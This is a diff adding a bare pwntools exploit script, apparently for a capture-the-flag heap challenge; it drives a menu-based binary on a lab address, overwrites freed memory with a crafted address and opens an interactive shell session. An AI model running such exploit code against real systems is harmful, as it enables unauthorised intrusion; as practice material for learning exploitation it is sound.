@@ -1,0 +1,30 @@
+from pwn import *
+
+s = remote('192.168.33.10',1234)
+s.sendline('1')
+time.sleep(0.2)
+s.sendline('1')
+time.sleep(0.2)
+s.sendline('1234')
+time.sleep(0.2)
+
+s.sendline('1')
+time.sleep(0.2)
+s.sendline('1')
+time.sleep(0.2)
+s.sendline('1234')
+time.sleep(0.2)
+
+s.sendline('2')
+time.sleep(0.2)
+s.sendline('0')
+time.sleep(0.2)
+
+s.sendline('3')
+time.sleep(0.2)
+s.sendline('0')
+time.sleep(0.2)
+s.send(p64(0x6020ca-0x8))
+time.sleep(0.2)
+s.sendline('1234')
+s.interactive()
